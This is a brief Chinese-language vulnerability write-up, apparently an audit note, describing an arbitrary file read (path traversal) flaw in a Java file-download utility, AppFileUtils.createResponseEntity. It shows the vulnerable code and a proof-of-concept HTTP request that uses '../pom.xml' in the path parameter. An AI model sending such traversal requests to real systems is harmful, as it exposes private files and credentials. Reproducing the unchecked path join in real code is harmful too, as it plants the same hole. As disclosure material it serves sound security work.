# 任意文件读取

漏洞代码

com.yeqifu.sys.common.AppFileUtils

漏洞出现在`File file = new File(UPLOAD_PATH, path);`，将path直接和UPLOAD_PATH拼接

```
public static ResponseEntity<Object> createResponseEntity(String path) {
        System.out.println("path:" + path);
        //1,构造文件对象
        File file = new File(UPLOAD_PATH, path);
        if (file.exists()) {
            //将下载的文件，封装byte[]
            byte[] bytes = null;
            try {
                bytes = FileUtil.readBytes(file);
            } catch (Exception e) {
                e.printStackTrace();
            }
            //创建封装响应头信息的对象
            HttpHeaders header = new HttpHeaders();
            //封装响应内容类型(APPLICATION_OCTET_STREAM 响应的内容不限定)
            header.setContentType(MediaType.APPLICATION_OCTET_STREAM);
            //创建ResponseEntity对象
            ResponseEntity<Object> entity = new ResponseEntity<Object>(bytes, header, HttpStatus.CREATED);
            return entity;
        } else {
            System.out.println("文件不存在");
        }
        return null;
    }
```

POC

```
GET /file/showImageByPath?path=../pom.xml HTTP/1.1
Host: 192.168.239.1:8888
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.239.1:8888/sys/toUserInfo
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=D14EE022DF12DEFB07D1866BC61D3356
Connection: keep-alive
```

